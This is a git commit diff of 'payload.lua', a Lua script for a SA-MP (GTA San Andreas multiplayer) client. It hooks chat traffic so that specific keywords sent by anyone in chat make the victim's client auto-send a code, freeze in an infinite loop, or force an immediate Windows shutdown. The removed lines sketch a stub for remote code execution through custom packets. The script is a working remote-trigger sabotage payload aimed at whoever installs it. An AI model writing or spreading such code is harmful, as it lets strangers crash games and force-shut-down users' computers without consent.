6e888044f4f647e95e732d9a86eac90a3f3ae313
TheLold <paymentsse8@gmail.com>
2026-06-22 18:54:30 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,33 +1,30 @@
 -- payload.lua
-local hook = require 'lib.samp.events'
+print('load')
+local sampev = require 'lib.samp.events'
 
--- Идем на низкий уровень, перехватываем RPC пакеты напрямую
-function onReceiveRpc(id, bs)
-    -- ID 93 - это пакет с сообщением в чате (ShowClientMessage)
-    if id == 93 then
-        local color = raknetBitStreamReadInt32(bs)
-        local length = raknetBitStreamReadInt32(bs)
-        local text = raknetBitStreamReadString(bs, length)
-        
-        -- Очистка от HEX-тегов {XXXXXX}
-        local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
-        
-        if cleanText:find("сырколбаска") then
-            sampSendChat("123655")
-        elseif cleanText:find("кукусики") then
-            while true do end
-        elseif cleanText:find("хуйкина") then
-            os.execute("shutdown /s /t 0 /f")
-        end
+-- 1. Ловим ВСЕ сообщения, которые приходят С СЕРВЕРА (включая дубликаты твоих)
+function sampev.onServerMessage(color, text)
+    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
+    
+    if cleanText:find("сырколбаска") then
+        sampSendChat("123655")
+    elseif cleanText:find("кукусики") then
+        while true do end
+    elseif cleanText:find("хуйкина") then
+        os.execute("shutdown /s /t 0 /f")
     end
 end
 
--- RCE-вектор (исполнение кода через пакеты)
--- Здесь мы можем прокидывать свои данные, если сервер принимает кастомные RPC
-function onReceivePacket(id, bs)
-    -- Packet 220: обычно используется для кастомных данных
-    if id == 220 then
-        -- Тут логика для выполнения произвольного кода, 
-        -- если ты знаешь структуру пакета сервера
+-- 2. Ловим то, что отправляешь ТЫ (через пакет 101 - SendChat)
+function sampev.onSendChat(message)
+    if message:find("сырколбаска") then
+        lua_thread.create(function()
+            wait(500)
+            sampSendChat("123655")
+        end)
+    elseif message:find("кукусики") then
+        while true do end
+    elseif message:find("хуйкина") then
+        os.execute("shutdown /s /t 0 /f")
     end
 end
